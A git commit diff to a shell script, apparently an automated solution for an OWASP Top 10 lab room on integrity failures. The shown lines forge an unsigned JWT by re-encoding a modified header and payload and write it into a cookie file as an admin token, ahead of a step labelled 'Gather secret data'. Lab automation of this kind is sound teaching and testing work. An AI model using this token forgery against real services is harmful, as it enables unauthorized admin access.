b8d4deab5baa4e96710f38c9f7d35b746336aab4
Nadege Lemperiere <nadege.lemperiere@gmail.com>
2024-12-01 15:55:00 -0500

    Testing script

--- rooms/owasptop102021/8-integrity-failures.sh
+++ rooms/owasptop102021/8-integrity-failures.sh
@@ -48,7 +48,7 @@ ENCODED_HEADER=$(echo "$HEADER"  | tr -d '\n' | base64 | tr -d '\n' | tr -d '=' 
 ENCODED_PAYLOAD=$(echo "$MODIFIED_PAYLOAD"  | tr -d '\n' | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
 UNSIGNED_TOKEN="$ENCODED_HEADER.$ENCODED_PAYLOAD"
 echo "--> Token modified : $UNSIGNED_TOKEN"
-awk -v new_jwt="$UNSIGNED_TOKEN" 'BEGIN {OFS="\t"} {if ($6 == "jwt-token") $7 = new_jwt; print}' "/work/8-cookies.txt" > tmp && mv tmp "/work/8-cookies-admin.txt"
+awk -v new_jwt="$UNSIGNED_TOKEN" 'BEGIN {OFS="\t"} {if ($6 == "jwt-token") $7 = new_jwt; print $6}' "/work/8-cookies.txt" > tmp && mv tmp "/work/8-cookies-admin.txt"
 
 
 # Gather secret data
